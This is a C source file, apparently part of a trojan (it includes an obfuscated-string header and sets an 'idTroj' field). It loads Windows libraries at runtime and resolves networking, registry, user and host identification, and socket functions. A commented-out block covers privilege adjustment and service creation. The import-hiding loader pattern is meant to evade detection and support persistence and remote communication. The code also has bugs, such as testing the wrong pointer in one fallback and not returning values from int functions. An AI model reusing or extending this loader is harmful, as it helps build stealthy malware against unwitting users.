#include "../include/loadDll.h"
#include "../include/ofuscstring.h"

int loadLibraryWinInet(DLLHANDLER *pHandler, API *pApi) {
     pHandler->hWinInet = LoadLibrary (STR_DLL_WININET);

     pApi->pInternetGetConnectedState = (fnINTERNETGETCONNECTEDSTATE)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETGETCONNECTEDSTATE);
     if (pApi->pInternetGetConnectedState==NULL)
        pApi->pInternetGetConnectedState = (fnINTERNETGETCONNECTEDSTATE)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETGETCONNECTEDSTATEA);   
     
     pApi->pInternetConnect = (fnINTERNETCONNECT)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETCONNECT);
     if (pApi->pInternetConnect==NULL)
        pApi->pInternetConnect = (fnINTERNETCONNECT)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETCONNECTA);


     pApi->pInternetAutodial = (fnINTERNETAUTODIAL)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETAUTODIAL);
     if (pApi->pInternetGetConnectedState==NULL) 
        pApi->pInternetAutodial = (fnINTERNETAUTODIAL)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETAUTODIALA);

     
     pApi->pInternetAutoDialHangup = (fnINTERNETAUTODIALHANGUP)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETAUTODIALHANGUP);
     if (pApi->pInternetAutoDialHangup==NULL) 
        pApi->pInternetAutoDialHangup = (fnINTERNETAUTODIALHANGUP)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETAUTODIALHANGUPA);

     pApi->pInternetOpen = (fnINTERNETOPEN)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETOPEN);
     if (pApi->pInternetOpen==NULL) 
        pApi->pInternetOpen = (fnINTERNETOPEN)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETOPENA);

        
     pApi->pInternetOpenUrl = (fnINTERNETOPENURL)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETOPENURL);
     if (pApi->pInternetOpenUrl==NULL) 
        pApi->pInternetOpenUrl = (fnINTERNETOPENURL)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETOPENURLA);
        
        
     pApi->pHttpQueryInfo = (fnHTTPQUERYINFO)GetProcAddress(pHandler->hWinInet, STR_DLL_HTTPQUERYINFO);
     if (pApi->pHttpQueryInfo==NULL) 
        pApi->pHttpQueryInfo = (fnHTTPQUERYINFO)GetProcAddress(pHandler->hWinInet, STR_DLL_HTTPQUERYINFOA);

        
     pApi->pInternetReadFile = (fnINTERNETREADFILE)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETREADFILE);
     if (pApi->pInternetReadFile==NULL) 
        pApi->pInternetReadFile = (fnINTERNETREADFILE)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETREADFILEA);
     
     
     pApi->pInternetCloseHandle = (fnINTERNETCLOSEHANDLE)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETCLOSEHANDLE);
     if (pApi->pInternetCloseHandle==NULL) 
        pApi->pInternetCloseHandle = (fnINTERNETCLOSEHANDLE)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETCLOSEHANDLEA);
        
     pApi->pHttpOpenRequest = (fnHTTPOPENREQUEST)GetProcAddress(pHandler->hWinInet, STR_DLL_HTTPOPENREQUEST);
     if (pApi->pHttpOpenRequest==NULL) 
        pApi->pHttpOpenRequest = (fnHTTPOPENREQUEST)GetProcAddress(pHandler->hWinInet,STR_DLL_HTTPOPENREQUESTA);    
     
     
     pApi->pHttpSendRequest = (fnHTTPSENDREQUEST)GetProcAddress(pHandler->hWinInet, STR_DLL_HTTPSENDREQUEST);
     if (pApi->pHttpSendRequest==NULL) 
        pApi->pHttpSendRequest = (fnHTTPSENDREQUEST)GetProcAddress(pHandler->hWinInet, STR_DLL_HTTPSENDREQUESTA);      
     
        
     pApi->pInternetQueryOption=( fnINTERNETQUERYOPTION) GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETQUERYOPTION);
     if (pApi->pInternetQueryOption==NULL) 
        pApi->pInternetQueryOption = (fnINTERNETQUERYOPTION)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETQUERYOPTIONA);
          
     
     pApi->pInternetSetOption = (fnINTERNETSETOPTION) GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETSETOPTION);
     if (pApi->pInternetSetOption==NULL) 
        pApi->pInternetSetOption = (fnINTERNETSETOPTION)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETSETOPTIONA);
     
     pApi->pInternetSetCookie = (fnINTERNETSETCOOKIE) GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETSETCOOKIE);
     if (pApi->pInternetSetCookie==NULL) 
        pApi->pInternetSetCookie = (fnINTERNETSETCOOKIE)GetProcAddress(pHandler->hWinInet, STR_DLL_INTERNETSETCOOKIEA);
          
     
     pApi->pHttpAddRequestHeaders = (fnHTTPADDREQUESTHEADERS) GetProcAddress(pHandler->hWinInet, STR_DLL_HTTPADDREQUESTHEADERS);
     if (pApi->pHttpAddRequestHeaders==NULL) 
        pApi->pHttpAddRequestHeaders = (fnHTTPADDREQUESTHEADERS)GetProcAddress(pHandler->hWinInet, STR_DLL_HTTPADDREQUESTHEADERSA);

     pApi->idTroj=0;
}

int loadLibraryAdvAPI32(DLLHANDLER *pHandler, API *pApi) {
     pHandler->hAdvApi32 = LoadLibrary (STR_DLL_ADVAPI);
     if (!pHandler->hAdvApi32)
        return 1;
     
     pApi->pRegOpenKeyEx = (fnREGOPENKEYEX)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGOPENKEYEX);
     if (pApi->pRegOpenKeyEx==NULL)
        pApi->pRegOpenKeyEx = (fnREGOPENKEYEX)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGOPENKEYEXA);
     
     pApi->pRegQueryValueEx = (fnREGQUERYVALUEEX)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGQUERYVALUEEX);     
     if (pApi->pRegQueryValueEx==NULL)
        pApi->pRegQueryValueEx = (fnREGQUERYVALUEEX)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGQUERYVALUEEXA);

     pApi->pRegOpenKey = (fnREGOPENKEY)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGOPENKEY);     
     if (pApi->pRegOpenKey==NULL)
          pApi->pRegOpenKey = (fnREGOPENKEY)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGOPENKEYA);

     pApi->pRegCreateKey = (fnREGCREATEKEY)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGCREATEKEY);
     if (pApi->pRegCreateKey==NULL)
          pApi->pRegCreateKey = (fnREGCREATEKEY)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGCREATEKEYA);
        
     pApi->pRegSetValueEx = (fnREGSETVALUEEX)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGSETVALUEEX);
     if (pApi->pRegSetValueEx==NULL)
          pApi->pRegSetValueEx = (fnREGSETVALUEEX)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGSETVALUEEXA);
     
     pApi->pRegCloseKey = (fnREGCLOSEKEY)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGCLOSEKEY);
     if (pApi->pRegCloseKey==NULL)
          pApi->pRegCloseKey = (fnREGCLOSEKEY)GetProcAddress(pHandler->hAdvApi32,STR_DLL_REGCLOSEKEYA);
     
     pApi->pGetUserName = (fnGETUSERNAME) GetProcAddress (pHandler->hAdvApi32,STR_DLL_GETUSERNAME);
     if (pApi->pGetUserName==NULL)
          pApi->pGetUserName = (fnGETUSERNAME) GetProcAddress (pHandler->hAdvApi32,STR_DLL_GETUSERNAMEA);
          
     pApi->pGetComputerName = (fnGETCOMPUTERNAME) GetProcAddress (pHandler->hAdvApi32,STR_DLL_GETCOMPUTERNAME);
     if (pApi->pGetComputerName==NULL)
          pApi->pGetComputerName = (fnGETCOMPUTERNAME) GetProcAddress (pHandler->hAdvApi32,STR_DLL_GETCOMPUTERNAMEA);
}
/*     pApi->pLookupPrivilegeValue=(fnLOOKUPPRIVILEGEVALUE)GetProcAddress(pHandler->hAdvApi32,"LookupPrivilegeValueA");
     pApi->pAdjustTokenPrivileges=(fnADJUSTTOKENPRIVILEGES)GetProcAddress(pHandler->hAdvApi32,"AdjustTokenPrivileges");
     pApi->pLookupPrivilegeValue=(fnLOOKUPPRIVILEGEVALUE)GetProcAddress(pHandler->hAdvApi32,"LookupPrivilegeValueA");
     pApi->pOpenProcessToken=(fnOPENPROCESSTOKEN)GetProcAddress(pHandler->hAdvApi32,"OpenProcessToken");
     pApi->pSetServiceStatus=(fnSETSERVICESTATUS) GetProcAddress(pHandler->hAdvApi32,"SetServiceStatus"); 
     pApi->pOpenSCManager=(fnOPENSCMANAGER) GetProcAddress(pHandler->hAdvApi32,"OpenSCManagerA");
     pApi->pGetServiceDisplayName=(fnGETSERVICEDISPLAYNAME) GetProcAddress(pHandler->hAdvApi32,"GetServiceDisplayNameA");
     pApi->pCloseServiceHandle=(fnCLOSESERVICEHANDLE) GetProcAddress(pHandler->hAdvApi32,"CloseServiceHandle");
     pApi->pOpenSCManager=(fnOPENSCMANAGER) GetProcAddress(pHandler->hAdvApi32,"OpenSCManagerA");
     pApi->pCreateService=(fnCREATESERVICE) GetProcAddress(pHandler->hAdvApi32,"CreateServiceA");
     pApi->pCloseServiceHandle=(fnCLOSESERVICEHANDLE) GetProcAddress(pHandler->hAdvApi32,"CloseServiceHandle");
     pApi->pOpenService=(fnOPENSERVICE) GetProcAddress(pHandler->hAdvApi32,"OpenServiceA");
     pApi->pStartService=(fnSTARTSERVICE) GetProcAddress(pHandler->hAdvApi32,"StartServiceA"); 
     pApi->pLookupPrivilegeValue=(fnLOOKUPPRIVILEGEVALUE)GetProcAddress(pHandler->hAdvApi32,"LookupPrivilegeValueA");
     pApi->pStartServiceCtrlDispatcher=(fnSTARTSERVICECTRLDISPATCHER) GetProcAddress(pHandler->hAdvApi32,"StartServiceCtrlDispatcherA");
}
*/
int loadLibraryShell32(DLLHANDLER *pHandler, API *pApi){
    pHandler->hShell32 = LoadLibrary (STR_DLL_SHELL);
    if (!pHandler->hShell32)
        return 1;
    pApi->pSHGetSpecialFolderPath=(fnSHGETSPECIALFOLDERPATH) GetProcAddress(pHandler->hShell32,STR_DLL_GETSPECIALFOLDERPATH);
    if (!pApi->pSHGetSpecialFolderPath)
       pApi->pSHGetSpecialFolderPath=(fnSHGETSPECIALFOLDERPATH) GetProcAddress(pHandler->hShell32,STR_DLL_GETSPECIALFOLDERPATHA);
}

int loadLibrarySocket(DLLHANDLER *pHandler, API *pApi){
    pHandler->hSocket = LoadLibrary (STR_DLL_SOCKET);
    if (!pHandler->hSocket)
        return 1;
    
    
    pApi->pWSAStartup=(fnWSASTARTUP) GetProcAddress(pHandler->hSocket,STR_DLL_WSASTARTUP);
    pApi->pWSASocket=(fnWSASOCKET) GetProcAddress(pHandler->hSocket,STR_DLL_WSASOCKET);
    if (!pApi->pWSASocket)
       pApi->pWSASocket=(fnWSASOCKET) GetProcAddress(pHandler->hSocket,STR_DLL_WSASOCKETA);   
    pApi->pWSACleanUP=(fnWSACLEANUP)GetProcAddress(pHandler->hSocket,STR_DLL_WSACLEANUP);
    pApi->pCloseSocket=(fnCLOSESOCKET)GetProcAddress(pHandler->hSocket,STR_DLL_CLOSESOCKET);
    pApi->pConnect=(fnCONNECT)GetProcAddress(pHandler->hSocket,STR_DLL_CONNECT);
    pApi->pHtons=(fnHTONS)GetProcAddress(pHandler->hSocket,STR_DLL_HTONS); 
    pApi->pInet_Addr=(fnINET_ADDR)GetProcAddress(pHandler->hSocket,STR_DLL_INET_ADDR);  
}

void freeLibraries(DLLHANDLER *pHandler) {
     FreeLibrary(pHandler->hWinInet);
     FreeLibrary(pHandler->hShell32);
     FreeLibrary(pHandler->hAdvApi32);
     FreeLibrary(pHandler->hSocket);
     pHandler->hWinInet=NULL;
}
